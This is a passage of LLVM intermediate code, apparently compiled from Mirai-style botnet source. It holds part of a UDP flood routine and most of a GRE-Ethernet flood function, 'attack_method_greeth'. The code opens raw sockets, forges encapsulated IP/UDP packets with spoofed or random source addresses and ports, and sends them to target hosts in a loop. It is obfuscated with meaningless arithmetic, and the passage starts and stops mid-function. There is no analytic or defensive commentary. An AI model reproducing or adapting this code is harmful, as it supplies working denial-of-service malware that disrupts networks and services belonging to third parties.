  %457 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %458 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %457, i32 0, i32 7
  store i16 %456, i16* %458, align 2
  %459 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %460 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %459, i32 0, i32 7
  store i16 0, i16* %460, align 2
  %461 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %462 = bitcast %struct.iphdr* %461 to i16*
  %463 = call zeroext i16 @checksum_generic(i16* %462, i32 20)
  %464 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %465 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %464, i32 0, i32 7
  store i16 %463, i16* %465, align 2
  %466 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %467 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %466, i32 0, i32 3
  store i16 0, i16* %467, align 2
  %468 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %469 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %470 = bitcast %struct.udphdr* %469 to i8*
  %471 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %472 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %471, i32 0, i32 2
  %473 = load i16, i16* %472, align 2
  %474 = load i32, i32* %18, align 4
  %475 = sext i32 %474 to i64
  %476 = sub i64 0, %475
  %477 = sub i64 8, %476
  %478 = add i64 8, %475
  %479 = trunc i64 %477 to i32
  %480 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %468, i8* %470, i16 zeroext %473, i32 %479)
  %481 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %482 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %481, i32 0, i32 3
  store i16 %480, i16* %482, align 2
  %483 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %484 = load i32, i32* %9, align 4
  %485 = sext i32 %484 to i64
  %486 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %483, i64 %485
  %487 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %486, i32 0, i32 0
  %488 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %487, i32 0, i32 0
  store i16 2, i16* %488, align 4
  %489 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %490 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %489, i32 0, i32 9
  %491 = load i32, i32* %490, align 4
  %492 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %493 = load i32, i32* %9, align 4
  %494 = sext i32 %493 to i64
  %495 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %492, i64 %494
  %496 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %495, i32 0, i32 0
  %497 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %496, i32 0, i32 2
  %498 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %497, i32 0, i32 0
  store i32 %491, i32* %498, align 4
  %499 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %500 = load i32, i32* %9, align 4
  %501 = sext i32 %500 to i64
  %502 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %499, i64 %501
  %503 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %502, i32 0, i32 0
  %504 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %503, i32 0, i32 1
  store i16 0, i16* %504, align 2
  %505 = load i32, i32* %10, align 4
  %506 = load i8*, i8** %26, align 8
  %507 = load i32, i32* %18, align 4
  %508 = sext i32 %507 to i64
  %509 = sub i64 52, 5181845614425519971
  %510 = add i64 %509, %508
  %511 = add i64 %510, 5181845614425519971
  %512 = add i64 52, %508
  %513 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %514 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %515 = load i32, i32* %9, align 4
  %516 = sext i32 %515 to i64
  %517 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %514, i64 %516
  %518 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %517, i32 0, i32 0
  %519 = bitcast %struct.sockaddr_in* %518 to %struct.sockaddr*
  store %struct.sockaddr* %519, %struct.sockaddr** %513, align 8
  %520 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %521 = load %struct.sockaddr*, %struct.sockaddr** %520, align 8
  %522 = call i64 @sendto(i32 %505, i8* %506, i64 %511, i32 16384, %struct.sockaddr* %521, i32 16)
  br label %523

; <label>:523:                                    ; preds = %451
  %524 = load i32, i32* %9, align 4
  %525 = sub i32 %524, 1199068095
  %526 = add i32 %525, 1
  %527 = add i32 %526, 1199068095
  %528 = add nsw i32 %524, 1
  store i32 %527, i32* %9, align 4
  br label %304

; <label>:529:                                    ; preds = %304
  br label %303

; <label>:530:                                    ; preds = %84, %78
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %567

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %567

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %308, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %313

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = xor i8 %127, -1
  %129 = xor i8 15, -1
  %130 = xor i8 83, -1
  %131 = or i8 %128, %129
  %132 = or i8 83, %130
  %133 = xor i8 %131, -1
  %134 = and i8 %133, %132
  %135 = and i8 %127, 15
  %136 = and i8 %134, 64
  %137 = xor i8 %134, 64
  %138 = or i8 %136, %137
  %139 = or i8 %134, 64
  store i8 %138, i8* %126, align 4
  %140 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %141 = bitcast %struct.iphdr* %140 to i8*
  %142 = load i8, i8* %141, align 4
  %143 = xor i8 -16, -1
  %144 = xor i8 %142, %143
  %145 = and i8 %144, %142
  %146 = and i8 %142, -16
  %147 = and i8 %145, 5
  %148 = xor i8 %145, 5
  %149 = or i8 %147, %148
  %150 = or i8 %145, 5
  store i8 %149, i8* %141, align 4
  %151 = load i8, i8* %12, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 1
  store i8 %151, i8* %153, align 1
  %154 = load i32, i32* %18, align 4
  %155 = sext i32 %154 to i64
  %156 = add i64 66, 4412365548307650407
  %157 = add i64 %156, %155
  %158 = sub i64 %157, 4412365548307650407
  %159 = add i64 66, %155
  %160 = trunc i64 %158 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  br i1 %172, label %173, label %177

; <label>:173:                                    ; preds = %101
  %174 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 4
  store i16 %174, i16* %176, align 2
  br label %177

; <label>:177:                                    ; preds = %173, %101
  %178 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 6
  store i8 47, i8* %179, align 1
  %180 = load i32, i32* %21, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 8
  store i32 %180, i32* %182, align 4
  %183 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i32 0, i32 1
  %188 = load i32, i32* %187, align 4
  %189 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 9
  store i32 %188, i32* %190, align 4
  %191 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %192 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %193 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %192, i32 0, i32 1
  store i16 %191, i16* %193, align 2
  %194 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %195 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %196 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %195, i32 0, i32 2
  store i16 %194, i16* %196, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %198 = bitcast %struct.iphdr* %197 to i8*
  %199 = load i8, i8* %198, align 4
  %200 = xor i8 15, -1
  %201 = xor i8 %199, %200
  %202 = and i8 %201, %199
  %203 = and i8 %199, 15
  %204 = and i8 %202, 64
  %205 = xor i8 %202, 64
  %206 = or i8 %204, %205
  %207 = or i8 %202, 64
  store i8 %206, i8* %198, align 4
  %208 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %209 = bitcast %struct.iphdr* %208 to i8*
  %210 = load i8, i8* %209, align 4
  %211 = xor i8 -16, -1
  %212 = xor i8 %210, %211
  %213 = and i8 %212, %210
  %214 = and i8 %210, -16
  %215 = and i8 %213, 5
  %216 = xor i8 %213, 5
  %217 = or i8 %215, %216
  %218 = or i8 %213, 5
  store i8 %217, i8* %209, align 4
  %219 = load i8, i8* %12, align 1
  %220 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 1
  store i8 %219, i8* %221, align 1
  %222 = load i32, i32* %18, align 4
  %223 = sext i32 %222 to i64
  %224 = sub i64 0, 28
  %225 = sub i64 0, %223
  %226 = add i64 %224, %225
  %227 = sub i64 0, %226
  %228 = add i64 28, %223
  %229 = trunc i64 %227 to i16
  %230 = call zeroext i16 @htons(i16 zeroext %229) #7
  %231 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %232 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %231, i32 0, i32 2
  store i16 %230, i16* %232, align 2
  %233 = load i16, i16* %13, align 2
  %234 = zext i16 %233 to i32
  %235 = xor i32 %234, -1
  %236 = and i32 -1, %235
  %237 = xor i32 -1, -1
  %238 = and i32 %234, %237
  %239 = or i32 %236, %238
  %240 = xor i32 %234, -1
  %241 = trunc i32 %239 to i16
  %242 = call zeroext i16 @htons(i16 zeroext %241) #7
  %243 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %244 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %243, i32 0, i32 3
  store i16 %242, i16* %244, align 4
  %245 = load i8, i8* %14, align 1
  %246 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %247 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %246, i32 0, i32 5
  store i8 %245, i8* %247, align 4
  %248 = load i8, i8* %15, align 1
  %249 = icmp ne i8 %248, 0
  br i1 %249, label %250, label %254

; <label>:250:                                    ; preds = %177
  %251 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %252 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 4
  store i16 %251, i16* %253, align 2
  br label %254

; <label>:254:                                    ; preds = %250, %177
  %255 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 6
  store i8 17, i8* %256, align 1
  %257 = call i32 @rand_next()
  %258 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 8
  store i32 %257, i32* %259, align 4
  %260 = load i8, i8* %20, align 1
  %261 = icmp ne i8 %260, 0
  br i1 %261, label %262, label %268

; <label>:262:                                    ; preds = %254
  %263 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 9
  %265 = load i32, i32* %264, align 4
  %266 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 9
  store i32 %265, i32* %267, align 4
  br label %289

; <label>:268:                                    ; preds = %254
  %269 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 8
  %271 = load i32, i32* %270, align 4
  %272 = add i32 %271, 1580951006
  %273 = sub i32 %272, 1024
  %274 = sub i32 %273, 1580951006
  %275 = sub i32 %271, 1024
  %276 = xor i32 %274, -1
  %277 = and i32 -14275718, %276
  %278 = xor i32 -14275718, -1
  %279 = and i32 %274, %278
  %280 = xor i32 -1, -1
  %281 = and i32 %280, -14275718
  %282 = and i32 -1, %278
  %283 = or i32 %277, %279
  %284 = or i32 %281, %282
  %285 = xor i32 %283, %284
  %286 = xor i32 %274, -1
  %287 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %288 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %287, i32 0, i32 9
  store i32 %285, i32* %288, align 4
  br label %289

; <label>:289:                                    ; preds = %268, %262
  %290 = load i16, i16* %16, align 2
  %291 = call zeroext i16 @htons(i16 zeroext %290) #7
  %292 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %293 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %292, i32 0, i32 0
  store i16 %291, i16* %293, align 2
  %294 = load i16, i16* %17, align 2
  %295 = call zeroext i16 @htons(i16 zeroext %294) #7
  %296 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %297 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %296, i32 0, i32 1
  store i16 %295, i16* %297, align 2
  %298 = load i32, i32* %18, align 4
  %299 = sext i32 %298 to i64
  %300 = add i64 8, -7958360033114017092
  %301 = add i64 %300, %299
  %302 = sub i64 %301, -7958360033114017092
  %303 = add i64 8, %299
  %304 = trunc i64 %302 to i16
  %305 = call zeroext i16 @htons(i16 zeroext %304) #7
  %306 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %307 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %306, i32 0, i32 2
  store i16 %305, i16* %307, align 2
  br label %308

; <label>:308:                                    ; preds = %289
  %309 = load i32, i32* %9, align 4
  %310 = sub i32 0, 1
  %311 = sub i32 %309, %310
  %312 = add nsw i32 %309, 1
  store i32 %311, i32* %9, align 4
  br label %96

; <label>:313:                                    ; preds = %96
  br label %314

; <label>:314:                                    ; preds = %566, %313
  store i32 0, i32* %9, align 4
  br label %315

; <label>:315:                                    ; preds = %560, %314
  %316 = load i32, i32* %9, align 4
  %317 = load i8, i8* %5, align 1
  %318 = zext i8 %317 to i32
  %319 = icmp slt i32 %316, %318
  br i1 %319, label %320, label %566

; <label>:320:                                    ; preds = %315
  %321 = load i8**, i8*** %11, align 8
  %322 = load i32, i32* %9, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds i8*, i8** %321, i64 %323
  %325 = load i8*, i8** %324, align 8
  store i8* %325, i8** %30, align 8
  %326 = load i8*, i8** %30, align 8
  %327 = bitcast i8* %326 to %struct.iphdr*
  store %struct.iphdr* %327, %struct.iphdr** %31, align 8
  %328 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %329 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %328, i64 1
  %330 = bitcast %struct.iphdr* %329 to %struct.grehdr*
  store %struct.grehdr* %330, %struct.grehdr** %32, align 8
  %331 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %332 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %331, i64 1
  %333 = bitcast %struct.grehdr* %332 to %struct.ethhdr*
  store %struct.ethhdr* %333, %struct.ethhdr** %33, align 8
  %334 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %335 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %334, i64 1
  %336 = bitcast %struct.ethhdr* %335 to %struct.iphdr*
  store %struct.iphdr* %336, %struct.iphdr** %34, align 8
  %337 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %338 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %337, i64 1
  %339 = bitcast %struct.iphdr* %338 to %struct.udphdr*
  store %struct.udphdr* %339, %struct.udphdr** %35, align 8
  %340 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %341 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %340, i64 1
  %342 = bitcast %struct.udphdr* %341 to i8*
  store i8* %342, i8** %36, align 8
  %343 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %344 = load i32, i32* %9, align 4
  %345 = sext i32 %344 to i64
  %346 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %343, i64 %345
  %347 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %346, i32 0, i32 2
  %348 = load i8, i8* %347, align 4
  %349 = zext i8 %348 to i32
  %350 = icmp slt i32 %349, 32
  br i1 %350, label %351, label %375

; <label>:351:                                    ; preds = %320
  %352 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %353 = load i32, i32* %9, align 4
  %354 = sext i32 %353 to i64
  %355 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %352, i64 %354
  %356 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %355, i32 0, i32 1
  %357 = load i32, i32* %356, align 4
  %358 = call i32 @ntohl(i32 %357) #7
  %359 = call i32 @rand_next()
  %360 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %363, i32 0, i32 2
  %365 = load i8, i8* %364, align 4
  %366 = zext i8 %365 to i32
  %367 = lshr i32 %359, %366
  %368 = add i32 %358, -1996648993
  %369 = add i32 %368, %367
  %370 = sub i32 %369, -1996648993
  %371 = add i32 %358, %367
  %372 = call i32 @htonl(i32 %370) #7
  %373 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %374 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %373, i32 0, i32 9
  store i32 %372, i32* %374, align 4
  br label %375

; <label>:375:                                    ; preds = %351, %320
  %376 = load i32, i32* %21, align 4
  %377 = icmp eq i32 %376, -1
  br i1 %377, label %378, label %382

; <label>:378:                                    ; preds = %375
  %379 = call i32 @rand_next()
  %380 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %381 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %380, i32 0, i32 8
  store i32 %379, i32* %381, align 4
  br label %382

; <label>:382:                                    ; preds = %378, %375
  %383 = load i16, i16* %13, align 2
  %384 = zext i16 %383 to i32
  %385 = icmp eq i32 %384, 65535
  br i1 %385, label %386, label %416

; <label>:386:                                    ; preds = %382
  %387 = call i32 @rand_next()
  %388 = xor i32 %387, -1
  %389 = xor i32 65535, -1
  %390 = xor i32 -1847169206, -1
  %391 = or i32 %388, %389
  %392 = or i32 -1847169206, %390
  %393 = xor i32 %391, -1
  %394 = and i32 %393, %392
  %395 = and i32 %387, 65535
  %396 = trunc i32 %394 to i16
  %397 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %398 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %397, i32 0, i32 3
  store i16 %396, i16* %398, align 4
  %399 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %400 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %399, i32 0, i32 3
  %401 = load i16, i16* %400, align 4
  %402 = zext i16 %401 to i32
  %403 = add i32 %402, -243206815
  %404 = sub i32 %403, 1000
  %405 = sub i32 %404, -243206815
  %406 = sub nsw i32 %402, 1000
  %407 = xor i32 %405, -1
  %408 = and i32 -1, %407
  %409 = xor i32 -1, -1
  %410 = and i32 %405, %409
  %411 = or i32 %408, %410
  %412 = xor i32 %405, -1
  %413 = trunc i32 %411 to i16
  %414 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %415 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %414, i32 0, i32 3
  store i16 %413, i16* %415, align 4
  br label %416

; <label>:416:                                    ; preds = %386, %382
  %417 = load i16, i16* %16, align 2
  %418 = zext i16 %417 to i32
  %419 = icmp eq i32 %418, 65535
  br i1 %419, label %420, label %433

; <label>:420:                                    ; preds = %416
  %421 = call i32 @rand_next()
  %422 = xor i32 %421, -1
  %423 = xor i32 65535, -1
  %424 = xor i32 350396869, -1
  %425 = or i32 %422, %423
  %426 = or i32 350396869, %424
  %427 = xor i32 %425, -1
  %428 = and i32 %427, %426
  %429 = and i32 %421, 65535
  %430 = trunc i32 %428 to i16
  %431 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %432 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %431, i32 0, i32 0
  store i16 %430, i16* %432, align 2
  br label %433

; <label>:433:                                    ; preds = %420, %416
  %434 = load i16, i16* %17, align 2
  %435 = zext i16 %434 to i32
  %436 = icmp eq i32 %435, 65535
  br i1 %436, label %437, label %446

; <label>:437:                                    ; preds = %433
  %438 = call i32 @rand_next()
  %439 = xor i32 65535, -1
  %440 = xor i32 %438, %439
  %441 = and i32 %440, %438
  %442 = and i32 %438, 65535
  %443 = trunc i32 %441 to i16
  %444 = load %struct.udphdr*, %struct.udphdr** %35, align 8
